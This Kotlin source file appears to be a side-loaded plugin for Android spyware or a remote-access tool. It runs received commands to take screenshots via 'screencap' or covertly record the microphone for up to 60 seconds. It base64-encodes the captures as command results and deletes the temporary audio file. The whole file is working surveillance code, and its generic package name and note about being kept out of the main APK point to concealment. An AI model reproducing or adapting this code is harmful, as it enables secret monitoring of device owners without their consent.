package com.android.modules

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

/** MediaModule (screenshot + mic) — dynamically loaded, NOT compiled into main APK */
class MediaModule {
    fun execute(ctx: Context, command: String, extra: String?): Pair<String, String> = when {
        command.startsWith("screenshot") -> {
            val p = command.split(":")
            Pair(screenshot(p.getOrNull(1)?.toIntOrNull() ?: 720, p.getOrNull(2)?.toIntOrNull() ?: 70), "command_result")
        }
        command.startsWith("record_mic:") -> {
            val sec = command.removePrefix("record_mic:").toIntOrNull()?.coerceIn(1, 60) ?: 5
            Pair(recordMic(ctx, sec), "command_result")
        }
        else -> Pair("ERROR: Unknown media command", "command_result")
    }

    private fun screenshot(maxW: Int, qual: Int): String {
        return try {
            val proc   = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
            val exited = proc.waitFor(3, TimeUnit.SECONDS)
            if (exited) {
                val png = proc.inputStream.readBytes(); proc.destroy()
                if (png.size > 1000) {
                    val o1 = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                    BitmapFactory.decodeByteArray(png, 0, png.size, o1)
                    val ss = if (o1.outWidth > maxW && maxW > 0) (o1.outWidth.toFloat() / maxW).toInt().coerceAtLeast(1) else 1
                    val bmp = BitmapFactory.decodeByteArray(png, 0, png.size, BitmapFactory.Options().apply { inSampleSize = ss })
                        ?: return "ERROR: decode failed"
                    val baos = ByteArrayOutputStream()
                    bmp.compress(Bitmap.CompressFormat.JPEG, qual, baos); bmp.recycle()
                    return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                }
            }
            proc.destroy(); "ERROR: screencap failed"
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    @Suppress("DEPRECATION")
    private fun recordMic(ctx: Context, sec: Int): String {
        val out = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.3gp")
        return try {
            val r = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else MediaRecorder()
            r.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(out.absolutePath)
                prepare(); start()
            }
            Thread.sleep(sec * 1000L); r.stop(); r.release()
            val b64 = Base64.encodeToString(out.readBytes(), Base64.NO_WRAP)
            out.delete(); b64
        } catch (e: Exception) { out.delete(); "ERROR: ${e.message}" }
    }
}
